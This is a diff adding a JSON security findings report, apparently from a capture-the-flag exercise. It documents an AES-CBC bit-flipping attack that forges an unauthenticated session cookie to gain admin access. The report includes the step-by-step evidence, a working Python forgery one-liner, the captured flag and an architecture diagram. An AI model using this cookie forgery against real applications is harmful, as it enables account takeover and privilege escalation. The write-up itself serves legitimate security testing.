@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:50:42.205960+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "bbd4fc2d-691b-4daa-bdbb-50a011c95f10",
+      "timestamp": "2026-04-12T21:50:42.205842+00:00",
+      "title": "AES-CBC Bit-Flipping Attack \u2014 Cookie Forgery to Admin",
+      "severity": "critical",
+      "target": "http://172.17.0.1:34389",
+      "description": "The application encrypts session cookies with AES-CBC but provides no MAC (message authentication code). This allows an attacker to perform a CBC bit-flipping attack: by XOR-ing specific bytes of the IV with `original_byte XOR desired_byte`, the corresponding plaintext byte can be changed arbitrarily without knowledge of the encryption key. The cookie stores the username in cleartext-equivalent form \u2014 the IV can be modified to change 'test1' to 'admin', granting administrator access and exposing the flag.",
+      "evidence": "1. Login as test1:test1 (credentials leaked in HTML comment) to get cookie:\n   session=3fa20709833f526da18e1adc36f005aaf0ddccf2728d81937d145b1a898412a0\n2. Cookie is 32 bytes: IV (bytes 0-15) + Ciphertext (bytes 16-31)\n3. XOR IV bytes 0-4 with 'test1' XOR 'admin' = [0x15,0x01,0x1e,0x1d,0x5f]\n4. Forged cookie: 2aa31914dc3f526da18e1adc36f005aaf0ddccf2728d81937d145b1a898412a0\n5. GET /welcome with forged cookie returns:\n   'Welcome admin! Here is your flag: flag{60afd62a-6165-42f9-9b06-e45c453d2902}'\n\nFLAG: flag{60afd62a-6165-42f9-9b06-e45c453d2902}",
+      "tool_used": "manual/python",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "python3 -c \"\ncookie_hex = '3fa20709833f526da18e1adc36f005aaf0ddccf2728d81937d145b1a898412a0'\ncookie_bytes = bytes.fromhex(cookie_hex)\niv = bytearray(cookie_bytes[:16])\nct = cookie_bytes[16:]\nfor i,(o,t) in enumerate(zip(b'test1',b'admin')): iv[i]^=o^t\nprint((bytes(iv)+ct).hex())\n# Use output as session cookie value against /welcome\n\"",
+        "expected": "flag{60afd62a-6165-42f9-9b06-e45c453d2902}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "2c084f55-701d-4729-88eb-269cba0b65fa",
+      "timestamp": "2026-04-12T21:50:48.888807+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"/login POST\"]\n  Browser --> Welcome[\"/welcome GET\"]\n  Login --> Cookie[\"AES-CBC Session Cookie\\n(IV + Ciphertext, no MAC)\"]\n  Cookie --> Welcome\n  Welcome --> Flag[\"Flag Revealed if username=admin\"]\n  Login --> Creds[\"Hardcoded Creds\\ntest1:test1 in HTML comment\"]\n  style Flag fill:#f00,color:#fff\n  style Creds fill:#f80,color:#fff"
+    }
+  ]
+}
